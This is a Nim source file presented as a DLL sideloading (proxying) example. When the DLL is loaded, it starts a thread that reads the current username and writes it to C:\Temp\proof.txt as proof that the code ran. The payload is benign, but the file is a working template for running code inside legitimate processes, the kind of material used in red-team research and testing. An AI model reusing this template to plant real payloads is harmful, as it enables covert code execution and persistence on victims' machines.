#[ 
  Nim DLL Sideloading (a.k.a. DLL proxying) example
  Author: Marcello Salvati (@byt3bl33d3r)

  Modifications to doMagic by cyllective (https://github.com/cyllective)
]#

import winim/lean

# If you prefer to not pass the .def file via CLI during compilation uncomment the line below, and replace with actual filename
#{.passl: " mydeffile.def".}

proc NimMain() {.cdecl, importc.}

proc doMagic(lpParameter: LPVOID) : DWORD {.stdcall.} =
    # whoami from https://github.com/chvancooten/NimPlant
    var 
        username: string
        buf : array[257, TCHAR]
        lpBuf : LPWSTR = addr buf[0]
        pcbBuf : DWORD = int32(len(buf))

    discard GetUserName(lpBuf, &pcbBuf)
    for character in buf:
        if character == 0: break
        username.add(char(character))

    var f = open("C:\\Temp\\proof.txt", FileMode.fmWrite)
    f.write(username)
    f.close()

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain() # You must manually import and start Nim's garbage collector if you define you're own DllMain
  case fdwReason:
    of DLL_PROCESS_ATTACH:
      var threadHandle = CreateThread(NULL, 0, doMagic, NULL, 0, NULL)
      CloseHandle(threadHandle)
    of DLL_THREAD_ATTACH:
      discard
    of DLL_THREAD_DETACH:
      discard
    of DLL_PROCESS_DETACH:
      discard
    else:
      discard

  return true
